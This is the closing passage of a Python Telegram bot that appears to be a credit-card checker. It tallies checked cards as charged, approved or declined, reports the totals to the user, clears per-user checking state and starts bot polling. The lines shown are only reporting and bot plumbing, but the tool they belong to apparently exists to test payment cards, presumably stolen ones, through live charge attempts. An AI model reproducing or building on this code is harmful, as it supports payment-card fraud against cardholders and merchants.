            f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙: {total_ccs}\n"
            f"𝘾𝙃𝘼𝙍𝙂𝙀𝘿: <b>{charged_count}</b>\n"
            f"𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿: <b>{approved_count}</b>\n"
            f"𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿: <b>{declined_count}</b>"
        )
        
        try:
            bot.edit_message_text(final_result_text, chat_id, message_id, reply_markup=None, parse_mode='HTML')
        except Exception:
            bot.send_message(chat_id, final_result_text, parse_mode='HTML')
            
    if user_id in STOP_FLAGS:
        del STOP_FLAGS[user_id]
    if user_id in CURRENT_CHECKERS:
        del CURRENT_CHECKERS[user_id]
# --- Bot Polling ---
try:
    print("Bot is starting...")
    bot.infinity_polling(timeout=10, long_polling_timeout=20)
except Exception as e:
    print(f"Bot failed to start or encountered an error: {e}")
